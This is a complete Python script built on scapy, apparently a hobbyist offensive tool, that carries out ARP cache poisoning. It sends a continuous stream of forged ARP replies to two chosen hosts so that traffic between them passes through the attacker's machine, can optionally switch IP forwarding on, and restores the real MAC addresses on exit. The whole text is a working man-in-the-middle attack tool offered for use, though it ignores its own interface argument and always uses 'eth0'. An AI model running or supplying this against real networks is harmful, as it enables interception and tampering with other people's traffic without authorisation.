#!/usr/bin/python3
# ------------------
# | Author: 4bytes |
# ------------------

# ==== IMPORTS ====

import logging
from scapy.all import *
import time, sys, argparse, os, signal

# ==== COLORS ====

red = "\033[0;31m"
purple = "\033[0;35m"
green = "\033[0;32m"
blue = "\033[0;34m"
dark_gray = "\033[1;30m"
light_gray = "\033[0;37m"
end = "\033[0m"

# ==== DISABLE STDERR ====

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# ==== ARGUMENT PARSER ====

parser = argparse.ArgumentParser(
    description="{}ARP Poisoner{}".format(green, end),
    usage="./arp_poisoner.py -i <interface> -i1 <Machine1 IP> -i2 <Machine2 IP> -m1 <Machine1 MAC> -m2 <Machine2 MAC> -ma <Your MAC> -f (toggle forwarding)")

parser.add_argument("-i", "--interface", required=True, type=str, help="Interface")
parser.add_argument("-i1", "--ip1", required=True, type=str, help="IP address 1")
parser.add_argument("-i2", "--ip2", required=True, type=str, help="IP address 2")
parser.add_argument("-m1", "--mac1", required=True, type=str, help="MAC address 1")
parser.add_argument("-m2", "--mac2", required=True, type=str, help="MAC address 2")
parser.add_argument("-ma", "--attackermac", required=True, type=str, help="your MAC")
parser.add_argument("-f", "--forward", action=argparse.BooleanOptionalAction, help="Toggle forwarding")
parser.set_defaults(forward=False)

args = parser.parse_args()

interface = args.interface
IP1 = args.ip1
IP2 = args.ip2
MAC1 = args.mac1
MAC2 = args.mac2
MACAttacker = args.attackermac

# ==== RESET VICTIMS ARP TABLE ====

def stop(sig, frame):

    print("%s[*]%s %sSending true MAC addresses%s..." % (green, end, dark_gray, end))

    send(ARP(op = 2, pdst = IP1, psrc = IP2, hwsrc = MAC2, hwdst = MAC1), iface="eth0", verbose=False, count=5)
    send(ARP(op = 2, pdst = IP2, psrc = IP1, hwsrc = MAC1, hwdst = MAC2), iface="eth0", verbose=False, count=5)

    os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")

    print("%s[!]%s %sExit...%s" % (red, end, dark_gray, end))

    sys.exit(1)

signal.signal(signal.SIGINT, stop)

# ==== BANNER ====

print("""%s
▄▄▄       ██▀███   ██▓███      ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ ▓█████  ██▀███
▒████▄    ▓██ ▒ ██▒▓██░  ██▒   ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒   ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒   ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄
 ▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░   ▒██▒ ░  ░░ ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░   ▓██░░▒████▒░██▓ ▒██▒
 ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░   ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░        ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
  ░   ▒     ░░   ░ ░░          ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░    ░     ░░   ░
      ░  ░   ░                              ░ ░   ░        ░      ░ ░           ░    ░  ░   ░

%s""" % (red, end))

# ==== MAIN ====

if __name__ == '__main__':

    if (args.forward == True):
        print("\n{}[+]{} {}Toggling forwarding...{}\n".format(blue, end, dark_gray, end))
        os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
    else:
        print("\n{}[+]{} {}Disabling forwardning...{}\n".format(blue, end, dark_gray, end))
        os.system("echo '0' > /proc/sys/net/ipv4/ip_forward")

    while True:

        time.sleep(1)

        print("%s[Packet 1]%s %s%s%s (%s%s%s) %s-->%s %s%s%s (%s%s%s)" % (red, end, green, IP2, end, dark_gray, MACAttacker, end, purple, end, green, IP1, end, dark_gray, MAC1, end))

        send(ARP(op = 2, pdst = IP1, psrc = IP2, hwsrc = MACAttacker, hwdst=MAC1), iface="eth0", verbose=False)

        print("%s[Packet 2]%s %s%s%s (%s%s%s) %s -->%s %s%s%s (%s%s%s)\n" % (red, end, green, IP1, end, dark_gray, MACAttacker, end, purple, end, green, IP2, end, dark_gray, MAC2, end))

        send(ARP(op = 2, pdst = IP2, psrc = IP1, hwsrc = MACAttacker, hwdst=MAC2), iface="eth0", verbose=False)